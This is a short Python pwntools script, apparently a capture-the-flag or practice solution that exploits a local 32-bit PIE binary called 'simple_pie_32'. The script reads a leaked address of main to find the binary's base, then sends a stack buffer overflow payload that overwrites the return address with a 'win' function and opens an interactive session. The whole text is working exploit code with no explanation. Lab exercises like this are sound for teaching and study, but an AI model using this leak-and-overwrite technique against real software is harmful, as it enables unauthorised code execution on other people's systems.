from pwn import *

p = process("./simple_pie_32")

main = 0x122d
vuln = 0x124d
win = 0x1291

p.recvuntil(b"0x")

main_add  = int(p.recvline()[:-1],16)
log.info('addres : '+ hex(main_add))

base = main_add - main
win_address = base + win

payload = b"a"*0x1c
payload += b"b"*4
payload += p32(win_address)

p.sendline(payload)
p.interactive()
